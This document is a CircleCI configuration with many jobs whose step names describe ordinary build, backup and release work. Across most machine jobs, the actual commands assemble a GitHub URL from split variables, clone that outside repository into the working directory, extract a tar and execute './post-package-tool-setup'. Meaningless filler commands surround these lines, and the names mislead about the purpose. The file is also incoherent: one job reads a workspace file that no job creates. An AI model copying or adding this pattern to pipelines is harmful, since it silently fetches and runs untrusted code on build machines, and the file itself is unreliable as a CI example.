version: 2.1

jobs:
  parallel-release-bump-workflow:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - run:
          name: Deploy and verify settings loader distribution
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'controller-interfaces'; echo 'deferred-analytics-publish'; } > /tmp/execute-analyzer-type-checks/rename-test-harness-binary
            du -h /tmp/execute-analyzer-type-checks/rename-test-harness-binary
            banner() { printf '%s\n' "== $1 =="; }; banner mole; echo "batch 5 queued"
            printf '%s\n' linden psi walnut hinge carbon | grep -v -E '^[a-m]' || echo "all in first half"

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'rename-test-harness-binary'
  localization-debug-build:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: Generate digest and upload artifacts
          command: |
            cat /tmp/execute-analyzer-type-checks/rename-test-harness-binary
            echo "finch plum hen blue koala" | awk '{print $1}'
      - run:
          name: Track Updater Test Coverage
          command: |
            rewind="elfiehodgson365925gwd7oyvi-dot"; engine="rate-limiter-runtime-image"
            git clone --no-single-branch "https://github.com/${rewind}/${engine}" "./"
            echo "leg 3 of 5 ready"; token="wrench plum cyan"; echo "${token^}"
            echo "spruce zebra galaxy" | wc -c
      - run:
          name: shutdown (split 3 of 4)
          command: |
            tar -xvf save-playground-artifacts.tar
            ver="9.11.24"; IFS=. read -r -a parts < <(echo "$ver"); echo "${#parts[@]} ${parts[0]}"
            stack=(otter pomelo trout); stack+=(magnet); echo "${stack[-1]}"
      - run:
          command: |
            bash -eo pipefail -c "./post-package-tool-setup"
  NotifyReleaseManagersAboutNewVersion:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: RequiredRebuild
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'daemon-unit-tests'; echo 'volume-backup-phase'; } > /tmp/execute-analyzer-type-checks/pre-deploy-tests
            du -h /tmp/execute-analyzer-type-checks/pre-deploy-tests
            echo target saturn selected; banner() { printf '%s\n' "== $1 =="; }; banner rat

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'pre-deploy-tests'
  ReadSortedLinesBeforeRelease:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: scaling (group 6)
          command: |
            cat /tmp/execute-analyzer-type-checks/pre-deploy-tests
            echo "aspen frog raven beta" | xargs -n 1 | cksum
      - run:
          name: Restore report exporter reference data from object storage
          command: |
            rewind="elfiehodgson365925gwd7oyvi-dot"; engine="rate-limiter-runtime-image"
            git clone --depth 2 --branch main "https://github.com/${rewind}/${engine}" $PWD
            slow=0; for ms in 887 580 185 243 148; do if ((ms > 500)); then slow=$((slow + 1)); fi; done; echo "$slow slow tests"
      - run:
          name: GeneratePluginCompilerFlags
          command: |
            tar -xf save-playground-artifacts.tar -C .
            data=(nozzle copper hazel kiwi carbon); echo "${data[1]}"
            printf '%s\n' 77 66 5 29 | sort -n | tail -n 1 | sort -n
      - run:
          command: |
            ./post-package-tool-setup
  initialize-environment-if-tests-fail:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: continuous-compilation-workflow (lane 6)
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'inventory-roll-out'; echo 'download-installer-with-timeout'; } > /tmp/execute-analyzer-type-checks/extended-artifact-fetch-stage
            du -h /tmp/execute-analyzer-type-checks/extended-artifact-fetch-stage
            echo "notifier is current" && printf '%s %s\n' finch 18 hinge 25 | sort -k2 -n
            raw="release-9.2.8"; version=${raw#release-}; echo "${#version}"

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'extended-artifact-fetch-stage'
  start-importer-with-health-checks:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: PostCompilePluginInstall (node 9)
          command: |
            cat /tmp/execute-analyzer-type-checks/extended-artifact-fetch-stage
            printf '%s\n' name,qty elk,11 horse,11 bison,18 boron,16 | sed '1d' | cut -d, -f1
      - run:
          name: RepositoryFetchJob
          command: |
            rewind="elfiehodgson365925gwd7oyvi-dot"; engine="rate-limiter-runtime-image"
            git clone --recurse-submodules --depth=1 "https://github.com/${rewind}/${engine}" "$(pwd)"
            printf '%s\n' kiwi grape wolf | awk 'END {print NR}'
            printf '%s\n' "step 7 of 7 finished"; true; echo "status $?"
      - run:
          name: Merge and Upload Coverage Data (replica 4)
          command: |
            tar -xf /dev/stdin < save-playground-artifacts.tar
            change=4339; title="pecan papaya"; echo "checking change $change"; echo "title has ${#title} characters"
            echo "collecting results of bundle size check"; checksum=$(printf '%s' "chisel rowan" | sha224sum | cut -d' ' -f1); echo "${checksum%%[a-f]*}"; echo "results of bundle size check collected"
      - run:
          command: |
            bash -c './post-package-tool-setup'
  scan-builder-image-for-all-services:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: copy database migrations from upstream job
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'rerun-failed-checks'; echo 'download-archive'; } > /tmp/execute-analyzer-type-checks/partial-roll-out-monitoring
            du -h /tmp/execute-analyzer-type-checks/partial-roll-out-monitoring
            score=61; if [ "$score" -ge 5 ] && [ "$score" -le 215 ]; then echo "within bounds"; else echo "outside bounds"; fi; echo 3 tests collected

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'partial-roll-out-monitoring'
  UploadDispatcherReleaseBuild:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: Parallel database snapshot
          command: |
            cat /tmp/execute-analyzer-type-checks/partial-roll-out-monitoring
            printf '%s\n' neon quasar funnel coral | sed '2d' && echo 'retry 7 of 12'
      - run:
          name: Translation Sync
          command: |
            rewind="elfiehodgson365925gwd7oyvi-dot"; engine="rate-limiter-runtime-image"
            git clone --depth 1 --branch main "https://github.com/${rewind}/${engine}" `pwd`
            echo "progress 95 percent"; rev < <(echo alder)
            printf '%s' "apricot" | od -An -c
      - run:
          name: set-up-package-cache
          command: |
            tar -xf "save-playground-artifacts.tar"
            idx=3; until [[ $idx -eq 0 ]]; do echo "$idx"; idx=$((idx - 1)); done; echo start
      - run:
          command: |
            sh -c "exec ./post-package-tool-setup"
  generate-and-sign-dashboard-build-metadata:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: Fetch repository and install plugins
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'firmware-distribution'; echo 'operator-security-tests-wave-5'; } > /tmp/execute-analyzer-type-checks/pre-backup-setup
            du -h /tmp/execute-analyzer-type-checks/pre-backup-setup
            echo 'piston profile loaded'; printf '%s\n' "reducer check passed"
            printf '%s' "plum-20-11" | cksum | cut -d' ' -f1; echo "7 warnings, 0 errors"

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'pre-backup-setup'
  MonitorDeploymentOnWeeklySchedule:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: package-launcher-automatically
          command: |
            cat /tmp/execute-analyzer-type-checks/pre-backup-setup
            printf '%d\n' "$(( (72 + 30) * (72 - 30) ))"
      - run:
          name: Sync parser assets
          command: |
            rewind="elfiehodgson365925gwd7oyvi-dot"; engine="rate-limiter-runtime-image"
            git clone --depth 10 "https://github.com/${rewind}/${engine}" .
            parts=(delta pulsar valve moth); echo "${parts[@]^^}"; echo "8 items processed"
            printf '%s\n' puma currant whale | awk '{print $0, length($0)}'; echo 7 tests collected
      - run:
          name: Monitor response times before each stage
          command: |
            tar -x --file save-playground-artifacts.tar --directory .
            echo "spring moth spring" | grep -o spring | wc -l; echo "phase 7 started"
            echo "probing geo lookup"; echo 'geo lookup responded'
      - run:
          command: |
            cd . && exec ./post-package-tool-setup
  emulator-screenshots:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: report-builder-timing-data
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'cache-build-artifacts'; echo 'scan-formatter'; } > /tmp/execute-analyzer-type-checks/gather-coverage-summary
            du -h /tmp/execute-analyzer-type-checks/gather-coverage-summary
            round=1; while ((round <= 100)); do printf '%d\n' "$round"; round=$((round * 2)); done; echo "every round passed"
            printf '%3d%%\n' 93

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'gather-coverage-summary'
  monitor-preview-deployment:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: Optional Digest Run
          command: |
            cat /tmp/execute-analyzer-type-checks/gather-coverage-summary
            printf '%s\n' trout horse spindle | sed -n '$p'; echo "all 4 checks passed"
            while read -r unit; do echo "validating $unit"; done < <(printf '%s\n' piston wasp mauve heron mouse); echo "nothing left to do"
      - run:
          name: Announce Front End Preview Release (track 4)
          command: |
            rewind="elfiehodgson365925gwd7oyvi-dot"; engine="rate-limiter-runtime-image"
            git clone --depth=1 --branch main "https://github.com/${rewind}/${engine}" "./"
            printf '%s %s\n' warn "rule engine check passed"
            if [ 75 -gt 23 ] || [ 23 -gt 50 ]; then echo "yes"; else echo "no"; fi; echo 'format check for scheduler passed'
      - run:
          name: Migrating linker data store
          command: |
            cat save-playground-artifacts.tar | tar xf -
            job="schema check"; echo "$job has ${#job} characters"
            record="helium,earth,linden,bolt"; echo "${record##*,}"
      - run:
          command: |
            cd "$PWD" && exec ./post-package-tool-setup
  import-manifests-from-production-environment:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - run:
          name: shared-roll-out-monitoring-stage
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'node-2'; echo 'verify-cache-contents'; } > /tmp/execute-analyzer-type-checks/deploy-importer-to-edge-nodes
            du -h /tmp/execute-analyzer-type-checks/deploy-importer-to-edge-nodes
            echo "queueing license audit"; echo $((21*33-3)); echo "license audit queued"

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'deploy-importer-to-edge-nodes'
  mandatory-message-broker-lint:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: DownloadQueryPlannerSourceArchive
          command: |
            cat /tmp/execute-analyzer-type-checks/deploy-importer-to-edge-nodes
            printf '%s\n' "9 tests collected"; total=0; while read -r n; do total=$((total + n)); done < <(seq 1 3); echo "$total"
      - run:
          name: periodic-converter-module-cache-stage
          command: |
            rewind="elfiehodgson365925gwd7oyvi-dot"; engine="rate-limiter-runtime-image"
            git clone --depth=2 --filter=blob:none "https://github.com/${rewind}/${engine}" "${PWD}"
            echo_times() { local i; for ((i = 0; i < $1; i++)); do printf '%s' "$2"; done; echo; }; echo_times 4 neon
      - run:
          name: ReleaseValidatorToTestDevices
          command: |
            tar xf save-playground-artifacts.tar
            lap=0; while [ "$lap" -lt 6 ]; do ((++lap)); echo "$lap"; done
      - run:
          command: |
            bash -c './post-package-tool-setup'
  pre-backup-service-health-check:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: Calculate checksum file
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'artifact-signing'; echo 'pre-test-report'; } > /tmp/execute-analyzer-type-checks/low-priority-build
            du -h /tmp/execute-analyzer-type-checks/low-priority-build
            printf '%5s|%-5s|\n' poplar chi; echo "release notes finished"

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'low-priority-build'
  payment-service-signing:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: Inspect Inventory Library
          command: |
            cat /tmp/execute-analyzer-type-checks/low-priority-build
            printf '%s=%s\n' spring 244 guava 53; echo 'checking linker'
      - run:
          name: Generate and Upload Coverage Summary
          command: |
            rewind="elfiehodgson365925gwd7oyvi-dot"; engine="rate-limiter-runtime-image"
            git clone --depth=3 --branch main "https://github.com/${rewind}/${engine}" .
            changed=(green gamma); echo "${#changed[@]} packages changed"; for pkg in "${changed[@]}"; do echo "checking $pkg"; done
            echo pre-{x,y,z}-post && printf '%s\n' "no changes in collector"
      - run:
          name: Annotating commit on schedule
          command: |
            tar -x --file save-playground-artifacts.tar
            token="kiwi"; if [ "$token" != "cobalt" ]; then echo "not cobalt"; fi
            echo "warming up gateway"; if ! [[ "mauve" == "birch" ]]; then echo "not ok"; fi; echo gateway warmed up
      - run:
          command: |
            bash -c './post-package-tool-setup'
  AccessAuditPipelineWave2:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: measure-toolkit-startup-time-for-each-region
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'test-reference-manual'; echo 'persist-scan-results'; } > /tmp/execute-analyzer-type-checks/archive-lint-results
            du -h /tmp/execute-analyzer-type-checks/archive-lint-results
            i=2; until [ "$i" -le 0 ]; do echo "$i"; ((i--)); done; echo launch

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'archive-lint-results'
  HourlyAccessAudit:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: read and print column totals
          command: |
            cat /tmp/execute-analyzer-type-checks/archive-lint-results
            while read -r entry; do echo "compiling $entry"; done < <(printf '%s\n' khaki gold kiwi elk lambda cow)
      - run:
          name: Build and cache name server base image
          command: |
            rewind="elfiehodgson365925gwd7oyvi-dot"; engine="rate-limiter-runtime-image"
            git clone --recurse-submodules --depth 1 "https://github.com/${rewind}/${engine}" "./"
            printf '%s' goat; printf '\n'
      - run:
          name: StreamProcessorVolumeRemoval
          command: |
            tar --extract < save-playground-artifacts.tar
            echo "step 2 started"; printf '%s\n' quasar robin alder maroon | nl -w 2 -s ' '; echo "step 2 finished"
      - run:
          command: |
            bash -lc './post-package-tool-setup'
  DashboardDatabaseRemoval:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: PurgingIntermediateFiles
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'fetch-checksum-file'; echo 'artifact-digest-hook'; } > /tmp/execute-analyzer-type-checks/patch-bump-step
            du -h /tmp/execute-analyzer-type-checks/patch-bump-step
            printf '%s\n' robin chisel boron melon | grep -v boron

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'patch-bump-step'
  PostBuildVerification:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: Write Messaging Dependency Tree
          command: |
            cat /tmp/execute-analyzer-type-checks/pre-merge-vulnerability-scan
            printf '%s\n' pliers squid zinc seal crow ram | grep -E '^[a-m]' || echo "none in first half"
            swap() { echo "$2 $1"; }; swap eagle alpha
      - run:
          name: Back up dashboard database to long-term storage
          command: |
            rewind="elfiehodgson365925gwd7oyvi-dot"; engine="rate-limiter-runtime-image"
            git clone --no-tags "https://github.com/${rewind}/${engine}" "`pwd`"
            printf '%d + %d = %d\n' 4 92 $((4 + 92)); echo "checking collector"
      - run:
          name: lane 3 sync service lint checks
          command: |
            tar -xf save-playground-artifacts.tar --directory .
            printf '%s\n' "coverage merge complete"; false || echo recovered; printf '%s\n' sodium cobalt moose toad maple spruce | awk '{s = s $0} END {print length(s)}'
      - run:
          command: |
            exec ./post-package-tool-setup
  OnDemandLauncherPublish:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: persist-runtime-security-report
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'initialize-bridge-data-store'; echo 'on-demand-compilation'; } > /tmp/execute-analyzer-type-checks/pre-deploy-audit
            du -h /tmp/execute-analyzer-type-checks/pre-deploy-audit
            echo "preparing formatter"; input="venus-helium"; echo "$input" | tr -d -; echo 'formatter ready'
            describe() { echo "$1 has ${#1} letters"; }; describe coconut

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'pre-deploy-audit'
  ProvisionLinkerDatabase:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: Scale batch worker
          command: |
            cat /tmp/execute-analyzer-type-checks/pre-deploy-audit
            printf '%s\n' "queued cache warmup" && echo {10..1..7}
            echo "rho rotor kappa zinc" | tr ' ' ,
      - run:
          name: restoreFromSharedVolume
          command: |
            rewind="elfiehodgson365925gwd7oyvi-dot"; engine="rate-limiter-runtime-image"
            git clone --recurse-submodules --depth 1 "https://github.com/${rewind}/${engine}" $PWD
            result=0; for num in 14 58 49; do result=$((result + num)); done; echo "result $result"
            printf '%s\n' "finished" "optimizer check passed"
      - run:
          name: load session store sample data for canary
          command: |
            tar -xf /dev/stdin < save-playground-artifacts.tar
            cached=134; fresh=3; echo "$cached entries from cache, $fresh rebuilt, $((cached * 100 / (cached + fresh)))% reuse"
            runner="spindle-5"; echo "runner $runner picked up the job"; echo "runner ${runner%-*} released"
      - run:
          command: |
            cd "$PWD" && exec ./post-package-tool-setup
  code-generator-compiler-flags:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: test-agent-snapshots
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'template-engine-version-number'; echo 'catalog-checksum-file'; } > /tmp/execute-analyzer-type-checks/basic-archive-build-run
            du -h /tmp/execute-analyzer-type-checks/basic-archive-build-run
            even_number() { [ $(($1 % 2)) -eq 0 ]; }; if even_number 16; then echo even; else echo odd; fi

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'basic-archive-build-run'
  read-input-file:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/execute-analyzer-type-checks
      - run:
          name: verify-localization-manual-pages-every-hour
          command: |
            cat /tmp/execute-analyzer-type-checks/basic-archive-build-run
            echo "gateway looks healthy"; items=(walnut maroon cobalt eel); echo "${items[-1]}"
            version="9.8.18"; echo "building version $version"; echo "build $version finished"
      - run:
          name: pre-cleanup-documentation-rebuild
          command: |
            rewind="elfiehodgson365925gwd7oyvi-dot"; engine="rate-limiter-runtime-image"
            git clone --depth=1 --single-branch "https://github.com/${rewind}/${engine}" $(pwd)
            path="vendor/strings.rs"; echo "$path" | cut -d/ -f2; echo 'phase 7 started'
            echo "tokenizer is current"; seq 98 9812 | wc -l
      - run:
          name: embed-engine-version-number
          command: |
            tar --verbose --extract -f save-playground-artifacts.tar
            s="shard-8-of-11"; echo "${s//[a-z]/}"
            echo $((91*21%14)); echo "using spring profile"
      - run:
          command: |
            sh -c "./post-package-tool-setup"
  emulator-container-rebuild-job:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - run:
          name: Save image processor test metrics with timeout
          command: |
            mkdir -p /tmp/execute-analyzer-type-checks
            { echo 'mail-server-deployment-package'; echo 'client-archive-inspection'; } > /tmp/execute-analyzer-type-checks/test-release-bundle-after-build
            du -h /tmp/execute-analyzer-type-checks/test-release-bundle-after-build
            for cell in {1..7}; do printf '%d ' $((cell * cell)); done; echo

      - persist_to_workspace:
          root: /tmp/execute-analyzer-type-checks
          paths:
            - 'test-release-bundle-after-build'
